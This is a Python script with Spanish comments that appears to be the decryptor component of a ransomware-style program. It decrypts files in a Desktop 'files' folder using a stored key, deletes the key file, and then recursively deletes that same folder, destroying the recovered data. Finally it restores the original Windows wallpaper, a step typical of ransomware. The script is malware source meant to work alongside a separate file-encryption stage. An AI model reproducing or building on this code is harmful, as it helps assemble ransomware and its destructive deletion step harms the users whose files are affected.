import os
import sys
import ctypes
import shutil

from utils import cargar_key, decrypt   


def decrypt_all(application_path):
    path_to_decrypt = os.path.join(application_path, "files")
    key = cargar_key()

    # Descifrar todos los archivos cifrados en la carpeta "files" del escritorio
    desktop_path = os.path.join(os.path.expanduser("~"), "Desktop")
    path_to_decrypt = os.path.join(desktop_path, "files")
    for root, directories, files in os.walk(path_to_decrypt):
        for file in files:
            file_path = os.path.join(root, file)
            decrypt([file_path], key)

    # Eliminar el archivo de clave "key.key"
    os.remove(os.path.join(application_path, "key.key"))

    # Eliminar la carpeta "files"
    shutil.rmtree(path_to_decrypt, ignore_errors=True)

    print("Carpeta 'files' eliminada con éxito.")

def change_wallpaper(original_wallpaper_path):
    SPI_SETDESKWALLPAPER = 20

    # Cambiar el fondo de pantalla al original
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, original_wallpaper_path, 3)

def main():
    if len(sys.argv) == 2 and sys.argv[1].lower() == "des":
        application_path = os.path.dirname(os.path.abspath(__file__))  # Ruta del directorio del script actual
        original_wallpaper_path = os.path.join(application_path, "original_wallpaper.bmp")
        
        decrypt_all(application_path)
        print("Archivos desencriptados y fondo de pantalla restaurado.")
        
        # Cambiar el fondo de pantalla al original al final del proceso
        change_wallpaper(original_wallpaper_path)
    else:
        print("Argumento inválido. Uso: python tu_script.py des")

if __name__ == '__main__':
    main()
